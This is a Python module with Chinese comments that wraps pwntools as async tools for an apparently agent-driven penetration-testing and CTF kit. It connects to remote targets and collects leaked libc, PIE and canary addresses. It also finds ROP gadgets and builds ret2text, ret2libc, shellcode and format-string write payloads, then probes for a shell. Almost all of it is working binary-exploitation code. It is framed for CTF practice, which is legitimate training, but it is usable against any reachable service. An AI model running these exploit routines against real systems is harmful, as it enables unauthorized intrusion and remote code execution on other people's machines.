"""
pwn_tools.py - Pwn 二进制利用工具封装层
PentestAgent M2 CTF Kit 模块的 pwntools 异步封装。
技术约束: Python 3.10+, 延迟加载 pwntools, async 异步, 返回 PwnResult, Windows 安全。
"""
from __future__ import annotations
import asyncio
import re
import struct
import json
import urllib.request
import urllib.error
from dataclasses import dataclass, field
from typing import Dict, List, Optional

_PWNTOOLS_AVAILABLE: bool = False
_pwntools = None
_io = None

def _get_pwntools():
    """延迟导入 pwntools 模块。"""
    global _PWNTOOLS_AVAILABLE, _pwntools
    if _pwntools is None:
        try:
            import pwn
            _pwntools = pwn
            _PWNTOOLS_AVAILABLE = True
        except ImportError:
            _PWNTOOLS_AVAILABLE = False
    return _pwntools

def _ensure_pwntools() -> bool:
    """确认 pwntools 是否可用。"""
    return _get_pwntools() is not None

def _get_io():
    """获取当前活跃的 tube 对象。"""
    global _io
    return _io

def _set_io(io) -> None:
    """设置当前 tube 对象。"""
    global _io
    _io = io

@dataclass
class PwnResult:
    """Pwn 操作结果对象，所有函数统一返回此类型，不抛异常。"""
    success: bool
    output: str = ""
    error: str = ""
    leaked_info: dict = field(default_factory=dict)
    payload: bytes = b""
    suggestions: List[str] = field(default_factory=list)

def _no_pwntools_result() -> PwnResult:
    """pwntools 未安装时的默认错误结果。"""
    return PwnResult(success=False, error="pwntools 未安装，请执行: pip install pwntools", suggestions=["pip install pwntools", "在 Linux 环境下运行以获得最佳体验"])

def _no_io_result() -> PwnResult:
    """未建立连接时的默认错误结果。"""
    return PwnResult(success=False, error="未建立连接，请先调用 pwn_remote()", suggestions=["先执行 pwn_remote(host, port) 建立连接"])

# ========== 1. 远程连接 ==========
async def pwn_remote(host: str, port: int, timeout: int = 30) -> PwnResult:
    """连接远程靶机。成功返回 banner 信息。
    Args: host-靶机地址; port-端口; timeout-超时秒数默认30
    内部: _get_pwntools().remote(host, port)
    """
    if not _ensure_pwntools():
        return _no_pwntools_result()
    pwn = _get_pwntools()
    try:
        loop = asyncio.get_event_loop()
        io = await loop.run_in_executor(None, lambda: pwn.remote(host, port, timeout=timeout))
        _set_io(io)
        try:
            raw = io.recv(timeout=3)
            banner = raw.decode("utf-8", errors="replace") if raw else ""
        except Exception:
            banner = ""
        return PwnResult(success=True, output=f"成功连接到 {host}:{port}\n{banner}",
                         suggestions=["使用 pwn_interactive_send() 与靶机交互", "使用 pwn_leak_info() 收集泄露信息"])
    except Exception as e:
        return PwnResult(success=False, error=f"连接失败: {type(e).__name__}: {e}",
                         suggestions=["检查靶机地址和端口是否正确", "确认网络可达性", "检查防火墙设置"])

# ========== 2. 交互式发送/接收 ==========
async def pwn_interactive_send(data, recv_size: int = 4096, recv_timeout: int = 5) -> PwnResult:
    """发送数据到已连接靶机并接收响应。str 自动 encode 为 bytes。
    无连接时返回 error="未建立连接，请先调用pwn_remote()"
    """
    if not _ensure_pwntools():
        return _no_pwntools_result()
    io = _get_io()
    if io is None:
        return _no_io_result()
    if isinstance(data, str):
        data = data.encode("utf-8")
    elif not isinstance(data, bytes):
        data = str(data).encode("utf-8")
    try:
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, io.send, data)
        try:
            raw = await loop.run_in_executor(None, lambda: io.recv(recv_size, timeout=recv_timeout))
            resp = raw.decode("utf-8", errors="replace") if raw else ""
        except Exception:
            resp = ""
        return PwnResult(success=True, output=resp)
    except Exception as e:
        return PwnResult(success=False, error=f"发送/接收失败: {type(e).__name__}: {e}")

# ========== 3. 泄露信息收集 ==========
async def pwn_leak_info(patterns: List[str] = None) -> PwnResult:
    """从靶机响应中收集泄露信息。自动检测地址格式(0x7f...)、canary等。
    返回 leaked_info 字典: {"libc_leak": "0x7f...", "canary": "0x...", ...}
    """
    if not _ensure_pwntools():
        return _no_pwntools_result()
    io = _get_io()
    if io is None:
        return _no_io_result()
    try:
        loop = asyncio.get_event_loop()
        raw = await loop.run_in_executor(None, lambda: io.recv(timeout=5))
        resp = raw.decode("utf-8", errors="replace") if raw else ""
        leaked: Dict[str, str] = {}
        for i, m in enumerate(re.findall(rb"0x[0-9a-fA-F]{12,16}", raw)[:5]):
            addr = m.decode(); val = int(addr, 16)
            if 0x7F0000000000 <= val <= 0x7FFFFFFFFFFF:
                leaked[f"libc_leak_{i}"] = addr
            elif 0x550000000000 <= val <= 0x57FFFFFFFFFF:
                leaked[f"pie_leak_{i}"] = addr
        for i, m in enumerate(re.findall(rb"0x[0-9a-fA-F]{14,16}00", raw)[:3]):
            leaked[f"canary_{i}"] = m.decode()
        for i, m in enumerate(re.findall(rb"0x7ff[ef][0-9a-fA-F]{9,12}", raw)[:3]):
            leaked[f"stack_leak_{i}"] = m.decode()
        if patterns:
            for pat in patterns:
                for j, cm in enumerate(re.findall(pat, resp)[:3]):
                    leaked[f"custom_{pat[:10]}_{j}"] = str(cm)
        suggestions = []
        if leaked:
            suggestions.extend(["使用泄露的地址计算 libc/PIE 基址", "使用 pwn_build_payload() 构建攻击 Payload"])
            if any("canary" in k for k in leaked):
                suggestions.append("Canary 泄露后可绕过栈保护")
        else:
            suggestions.append("未检测到泄露，尝试触发更多输出（如格式化字符串）")
        return PwnResult(success=True, output=resp, leaked_info=leaked, suggestions=suggestions)
    except Exception as e:
        return PwnResult(success=False, error=f"信息收集失败: {type(e).__name__}: {e}")

# ========== 4. 格式化字符串攻击 ==========
async def pwn_fmtstr_attack(offset: int, target_addr: int = None, target_value: int = None) -> PwnResult:
    """格式化字符串攻击。只提供 offset 时做读取；提供 target_addr+value 时做写入。
    Args: offset-栈偏移; target_addr-写入目标地址; target_value-写入目标值
    """
    if not _ensure_pwntools():
        return _no_pwntools_result()
    io = _get_io()
    if io is None:
        return _no_io_result()
    try:
        pwn = _get_pwntools()
        loop = asyncio.get_event_loop()
        if target_addr is None or target_value is None:
            fmt_payload = f"%{offset}$p\n".encode()
            await loop.run_in_executor(None, io.send, fmt_payload)
            raw = await loop.run_in_executor(None, lambda: io.recv(timeout=3))
            leaked = raw.decode("utf-8", errors="replace").strip() if raw else ""
            match = re.search(r"0x[0-9a-fA-F]+", leaked)
            leaked_info = {f"offset_{offset}": match.group()} if match else {}
            return PwnResult(success=True, output=f"偏移 {offset} 处泄露: {leaked}",
                             payload=fmt_payload, leaked_info=leaked_info,
                             suggestions=["验证泄露地址是否有效", "进入写入模式覆盖 GOT/返回地址"])
        else:
            payload = await loop.run_in_executor(None, lambda: pwn.fmtstr_payload(
                offset, {target_addr: target_value}, write_size="byte"))
            await loop.run_in_executor(None, io.send, payload)
            return PwnResult(success=True, output=f"格式化字符串写入完成: {hex(target_addr)} = {hex(target_value)}",
                             payload=payload, suggestions=["验证写入是否成功", "继续交互获取 shell"])
    except Exception as e:
        return PwnResult(success=False, error=f"格式化字符串攻击失败: {type(e).__name__}: {e}",
                         suggestions=["检查偏移是否正确", "确认是 32 位还是 64 位程序"])

# ========== 5. ROP Gadget 搜索 ==========
async def pwn_rop_gadgets(binary_path: str = None, libc_path: str = None) -> PwnResult:
    """ROP gadget 搜索。返回常用 gadgets：pop_rdi, pop_rsi, ret, system, binsh 等。
    Args: binary_path-目标二进制; libc_path-libc文件路径
    """
    if not _ensure_pwntools():
        return _no_pwntools_result()
    try:
        pwn = _get_pwntools()
        gadgets: Dict[str, str] = {}; suggestions = []
        if binary_path:
            try:
                elf = pwn.ELF(binary_path, checksec=False)
                rop = pwn.ROP(elf)
                for name, getter in [("pop_rdi", "rdi"), ("pop_rsi", "rsi"), ("pop_rdx", "rdx"), ("ret", "ret")]:
                    try:
                        g = getattr(rop, getter)
                        if g and g.address: gadgets[name] = hex(g.address)
                    except Exception: pass
                suggestions.append(f"二进制: {binary_path}")
            except Exception as e: suggestions.append(f"解析二进制失败: {e}")
        if libc_path:
            try:
                libc = pwn.ELF(libc_path, checksec=False)
                libc_rop = pwn.ROP(libc)
                try: gadgets["libc_pop_rdi"] = hex(libc_rop.rdi.address)
                except Exception: pass
                sym = libc.symbols.get("system", 0)
                if sym: gadgets["libc_system"] = hex(sym)
                try: gadgets["libc_binsh"] = hex(next(libc.search(b"/bin/sh\x00")))
                except StopIteration: pass
                suggestions.append(f"libc: {libc_path}")
            except Exception as e: suggestions.append(f"解析 libc 失败: {e}")
        if not gadgets: suggestions.append("未找到 gadget，请提供有效的二进制文件路径")
        suggestions.append("使用 pwn_build_payload() 组合 gadget 构建攻击")
        return PwnResult(success=len(gadgets) > 0, output=f"找到 {len(gadgets)} 个 gadget",
                         leaked_info=gadgets, suggestions=suggestions)
    except Exception as e:
        return PwnResult(success=False, error=f"ROP gadget 搜索失败: {type(e).__name__}: {e}",
                         suggestions=["确认 ROPgadget 工具可用", "检查二进制文件是否存在"])

# ========== 6. Payload 构建 ==========
async def pwn_build_payload(payload_type: str, **kwargs) -> PwnResult:
    """构建常见攻击 Payload。
    支持类型:
        "ret2text": kwargs={target_addr, buffer_size}
        "ret2libc": kwargs={system_addr, binsh_addr, pop_rdi, ret_gadget, buffer_size}
        "shellcode": kwargs={shellcode_bytes, buffer_size}
        "fmtstr_write": kwargs={offset, target_addr, target_value}
    """
    if not _ensure_pwntools():
        return _no_pwntools_result()
    try:
        pwn = _get_pwntools()
        context_bits = kwargs.get("context_bits", 64)
        pack_fmt = {64: "Q", 32: "I"}.get(context_bits, "Q")
        mask = (1 << context_bits) - 1
        def _pack(v): return struct.pack(f"<{pack_fmt}", v & mask)
        suggestions = []
        if payload_type == "ret2text":
            payload = b"A" * kwargs.get("buffer_size", 64) + _pack(kwargs.get("target_addr", 0))
            suggestions.append("确保 buffer_size 正确覆盖到返回地址")
        elif payload_type == "ret2libc":
            buf = b"A" * kwargs.get("buffer_size", 64)
            if kwargs.get("ret_gadget"): buf += _pack(kwargs["ret_gadget"])
            payload = buf + _pack(kwargs["pop_rdi"]) + _pack(kwargs["binsh_addr"]) + _pack(kwargs["system_addr"])
            suggestions.append("ret2libc: pop_rdi -> /bin/sh -> system")
        elif payload_type == "shellcode":
            sc = kwargs.get("shellcode_bytes", pwn.asm(pwn.shellcraft.sh()))
            bs = kwargs.get("buffer_size", 64)
            ns = kwargs.get("nop_sled", 0)
            payload = (b"\x90" * ns + sc) if ns > 0 else sc
            if len(payload) < bs: payload = payload.ljust(bs, b"\x90")
            elif len(payload) > bs: suggestions.append(f"shellcode({len(payload)}) 超过 buffer_size({bs})，请调整")
            suggestions.append("确保栈可执行或利用 jmp rsp 等技巧")
        elif payload_type == "fmtstr_write":
            payload = pwn.fmtstr_payload(kwargs["offset"], {kwargs["target_addr"]: kwargs["target_value"]}, write_size="byte")
            suggestions.append("格式化字符串写入后应立即验证结果")
        else:
            return PwnResult(success=False, error=f"不支持的 Payload 类型: {payload_type}",
                             suggestions=["支持的类型: ret2text, ret2libc, shellcode, fmtstr_write"])
        return PwnResult(success=True, output=f"构建 {payload_type} Payload 成功，长度 {len(payload)} bytes",
                         payload=payload, suggestions=suggestions)
    except Exception as e:
        return PwnResult(success=False, error=f"Payload 构建失败: {type(e).__name__}: {e}",
                         suggestions=["检查参数是否完整且类型正确"])

# ========== 7. 获取 Shell ==========
async def pwn_get_shell() -> PwnResult:
    """获取交互式 shell。调用 _get_io().interactive() 的异步适配版本。
    异步环境中尝试触发 shell 并返回结果。
    """
    if not _ensure_pwntools():
        return _no_pwntools_result()
    io = _get_io()
    if io is None:
        return _no_io_result()
    try:
        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, io.sendline, b"id")
        try:
            raw = await loop.run_in_executor(None, lambda: io.recv(timeout=3))
            resp = raw.decode("utf-8", errors="replace") if raw else ""
        except Exception: resp = ""
        got_shell = any(k in resp for k in ("uid=", "root", "#", "$"))
        if got_shell:
            return PwnResult(success=True, output=f"成功获取 shell!\n{resp}",
                             suggestions=["使用 io.interactive() 在同步环境中交互", "发送命令获取 flag"])
        return PwnResult(success=False, output=resp, error="未检测到 shell 提示符，可能未成功获取 shell",
                         suggestions=["检查 payload 是否正确", "确认漏洞利用路径无误", "尝试手动发送 'ls' 或 'cat flag' 验证"])
    except Exception as e:
        return PwnResult(success=False, error=f"获取 shell 失败: {type(e).__name__}: {e}")

# ========== 8. 二进制扫描 ==========
async def pwn_scan_gadgets(binary_path: str) -> PwnResult:
    """扫描二进制文件的 gadgets 和有用地址：保护机制、常用gadgets、PLT/GOT表项、字符串（如/bin/sh）。
    Args: binary_path-二进制文件路径
    """
    if not _ensure_pwntools():
        return _no_pwntools_result()
    try:
        pwn = _get_pwntools()
        elf = pwn.ELF(binary_path, checksec=False)
        info = {"arch": elf.arch, "bits": str(elf.bits), "NX": str(elf.nx),
                "PIE": str(elf.pie), "canary": str(elf.canary), "relro": str(elf.relro)}
        if hasattr(elf, "fortify"): info["fortify"] = str(elf.fortify)
        try:
            rop = pwn.ROP(elf)
            for attr, key in [("rdi", "pop_rdi"), ("ret", "ret_gadget")]:
                if hasattr(rop, attr):
                    g = getattr(rop, attr)
                    if g and g.address: info[key] = hex(g.address)
        except Exception: pass
        got = {k: hex(v) for k, v in list(elf.got.items())[:20]}
        plt = {k: hex(v) for k, v in list(elf.plt.items())[:20]}
        if got: info["got"] = str(got)
        if plt: info["plt"] = str(plt)
        for sname, sbytes in [("str_binsh", b"/bin/sh\x00"), ("str_flag", b"flag")]:
            try: info[sname] = hex(next(elf.search(sbytes)))
            except StopIteration: pass
        suggestions = []
        if not elf.nx: suggestions.append("NX 关闭，可使用 shellcode 直接执行")
        if not elf.canary: suggestions.append("无 Canary，可直接栈溢出")
        if not elf.pie: suggestions.append("无 PIE，可直接使用硬编码地址")
        suggestions.append("使用 pwn_build_payload() 构建对应攻击")
        return PwnResult(success=True, output=f"扫描完成: {binary_path}",
                         leaked_info=info, suggestions=suggestions)
    except Exception as e:
        return PwnResult(success=False, error=f"扫描失败: {type(e).__name__}: {e}",
                         suggestions=["确认二进制文件存在且可读", "检查文件是否为 ELF 格式"])

# ========== 9. Libc 搜索 ==========
async def pwn_libc_search(leaked_addr: int, symbol: str = "__libc_start_main") -> PwnResult:
    """根据泄露的 libc 地址识别 libc 版本。使用 libc.rip API 查询。
    Args: leaked_addr-泄露的 libc 函数地址; symbol-对应符号名，默认 __libc_start_main
    """
    if leaked_addr == 0:
        return PwnResult(success=False, error="泄露地址不能为 0",
                         suggestions=["先使用 pwn_leak_info() 获取有效地址"])
    try:
        url = "https://libc.rip/api/find"
        data = ('{"symbols": {"%s": "%s"}}' % (symbol, hex(leaked_addr))).encode("utf-8")
        loop = asyncio.get_event_loop()
        def _req():
            req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"}, method="POST")
            with urllib.request.urlopen(req, timeout=15) as resp:
                return resp.read().decode("utf-8")
        raw_json = await loop.run_in_executor(None, _req)
        result_list = json.loads(raw_json)
        if not result_list:
            return PwnResult(success=False, output=raw_json, error="未找到匹配的 libc 版本",
                             suggestions=["检查泄露地址是否正确", "尝试其他符号如 __libc_start_main_ret"])
        best = result_list[0]
        info = {"libc_id": best.get("id", "unknown"), "libc_url": best.get("download_url", ""),
                "symbols": str(best.get("symbols", {}))}
        return PwnResult(success=True, output=f"匹配到 libc: {info['libc_id']}", leaked_info=info,
                         suggestions=[f"下载链接: {info['libc_url']}", "下载 libc 后使用 pwn_rop_gadgets() 搜索 gadget",
                                      "计算偏移: base_addr = leaked_addr - symbol_offset"])
    except urllib.error.HTTPError as e:
        return PwnResult(success=False, error=f"libc.rip API 请求失败: HTTP {e.code}",
                         suggestions=["检查网络连接", "稍后重试", "手动访问 https://libc.rip/"])
    except Exception as e:
        return PwnResult(success=False, error=f"libc 搜索失败: {type(e).__name__}: {e}",
                         suggestions=["确认网络可访问 libc.rip", "尝试手动查询"])

# ========== 10. 关闭连接 ==========
async def pwn_close() -> PwnResult:
    """关闭当前连接，清理资源。_set_io(None)"""
    io = _get_io()
    if io is None:
        return PwnResult(success=True, output="无活跃连接需要关闭")
    try:
        io.close()
    except Exception:
        pass
    finally:
        _set_io(None)
    return PwnResult(success=True, output="连接已关闭", suggestions=["如需重新连接，调用 pwn_remote()"])
